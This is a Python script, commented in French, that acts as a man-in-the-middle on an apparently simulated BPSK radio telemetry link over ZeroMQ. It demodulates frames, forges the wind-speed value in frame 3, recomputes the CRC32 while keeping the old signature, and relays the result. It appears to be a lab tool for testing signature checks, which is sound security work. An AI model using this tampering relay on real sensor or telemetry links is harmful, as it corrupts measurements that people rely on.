import json
import struct
import zlib

import numpy as np
import zmq


# ========================================
# CONFIGURATION
# ========================================

SOURCE_ADDRESS = "tcp://10.10.1.1:5555"
DESTINATION_ADDRESS = "tcp://10.10.2.10:5556"

PREAMBLE = b"\x1a\xcf\xfc\x1d"
SAMPLES_PER_SYMBOL = 4
SIGNATURE_LENGTH = 64

# Modifier uniquement la trame 3
TARGET_SEQUENCE = 3

# Fausse mesure injectée par l'attaquant
FORGED_WIND_SPEED = 99.9


# ========================================
# DEMODULATION BPSK
# ========================================

def demodulate(iq_bytes):

    if len(iq_bytes) % 8:
        raise ValueError("INVALID_IQ_LENGTH")

    iq = np.frombuffer(
        iq_bytes,
        dtype=np.complex64
    )

    if iq.size == 0 or iq.size % SAMPLES_PER_SYMBOL:
        raise ValueError("INVALID_SYMBOL_COUNT")

    symbols = iq.reshape(
        -1, SAMPLES_PER_SYMBOL
    ).real.mean(axis=1)

    bits = (symbols < 0).astype(np.uint8)

    return np.packbits(bits).tobytes()


# ========================================
# MODULATION BPSK
# ========================================

def modulate(frame):

    bits = np.unpackbits(
        np.frombuffer(frame, dtype=np.uint8)
    )

    symbols = 1.0 - 2.0 * bits.astype(np.float32)

    iq = np.repeat(
        symbols,
        SAMPLES_PER_SYMBOL
    ).astype(np.complex64)

    return iq.tobytes()


# ========================================
# ATTAQUE TAMPERING
# ========================================

def modify_iq(iq_bytes):

    # 1. Reconstruire la trame
    frame = demodulate(iq_bytes)

    if len(frame) < 4 + 2 + SIGNATURE_LENGTH + 4:
        raise ValueError("FRAME_TOO_SHORT")

    if frame[:4] != PREAMBLE:
        raise ValueError("INVALID_PREAMBLE")

    # 2. Extraire la longueur du payload
    size = struct.unpack("!H", frame[4:6])[0]

    if not 0 < size <= 4096:
        raise ValueError("INVALID_PAYLOAD_LENGTH")

    expected_size = (
        4 + 2 + size + SIGNATURE_LENGTH + 4
    )

    if len(frame) != expected_size:
        raise ValueError("INVALID_FRAME_SIZE")

    # 3. Vérifier le CRC32 de départ
    original_crc = struct.unpack(
        "!I", frame[-4:]
    )[0]

    actual_crc = zlib.crc32(
        frame[4:-4]
    ) & 0xFFFFFFFF

    if original_crc != actual_crc:
        raise ValueError("ORIGINAL_CRC_INVALID")

    # 4. Lire l'observation
    payload = json.loads(
        frame[6:6 + size].decode("utf-8")
    )

    if not isinstance(payload, dict):
        raise ValueError("INVALID_OBSERVATION")

    seq = payload.get("sequence_number")

    if type(seq) is not int:
        raise ValueError("INVALID_SEQUENCE")

    # Les trames 1, 2, 4 et 5 restent intactes
    if seq != TARGET_SEQUENCE:
        return iq_bytes, seq, False

    # 5. Modifier la mesure du vent
    old_speed = payload.get("wind_speed_ms")

    payload["wind_speed_ms"] = FORGED_WIND_SPEED

    new_payload = json.dumps(
        payload,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=False,
        allow_nan=False
    ).encode("utf-8")

    # 6. Conserver l'ancienne signature
    old_signature = frame[6 + size:-4]

    # 7. Reconstruire le corps de la trame
    body = (
        struct.pack("!H", len(new_payload))
        + new_payload
        + old_signature
    )

    # 8. Recalculer le CRC32
    new_crc = zlib.crc32(body) & 0xFFFFFFFF

    forged_frame = (
        PREAMBLE
        + body
        + struct.pack("!I", new_crc)
    )

    print(
        f"[TAMPER] seq={seq} | "
        f"wind: {old_speed} -> {FORGED_WIND_SPEED} m/s"
    )

    print(
        "[TAMPER] CRC32 recalculé ; "
        "signature originale conservée"
    )

    # 9. Remoduler la trame falsifiée
    return modulate(forged_frame), seq, True


# ========================================
# CANAL D'ATTAQUE
# ========================================

def main():

    context = zmq.Context()

    receiver = context.socket(zmq.PULL)
    sender = context.socket(zmq.PUSH)

    receiver.setsockopt(zmq.LINGER, 0)

    sender.setsockopt(zmq.LINGER, 1000)
    sender.setsockopt(zmq.IMMEDIATE, 1)
    sender.setsockopt(zmq.SNDTIMEO, 5000)

    receiver.bind(SOURCE_ADDRESS)
    sender.connect(DESTINATION_ADDRESS)

    print("[CANAL] Mode TAMPERING — seq=3 uniquement")
    print(
        f"[CANAL] {SOURCE_ADDRESS} -> "
        f"{DESTINATION_ADDRESS}"
    )

    received = 0
    forwarded = 0
    tampered = 0

    try:

        while True:

            original_iq = receiver.recv()

            received += 1

            try:

                output_iq, seq, changed = modify_iq(
                    original_iq
                )

                sender.send(output_iq)

                forwarded += 1

                if changed:
                    tampered += 1

                status = "MODIFIÉE" if changed else "INTACTE"

                print(
                    f"[TX] seq={seq} | "
                    f"{status} | "
                    f"{len(output_iq)} octets"
                )

            except (ValueError, zmq.Again) as error:

                print(
                    f"[ERROR] Bloc #{received} "
                    f"non transmis : {error}"
                )

    except KeyboardInterrupt:

        print("\n[CANAL] Arrêt manuel")

    finally:

        receiver.close()
        sender.close()
        context.term()

        print(
            f"[BILAN] reçus={received}, "
            f"relayés={forwarded}, "
            f"modifiés={tampered}"
        )


if __name__ == "__main__":
    main()
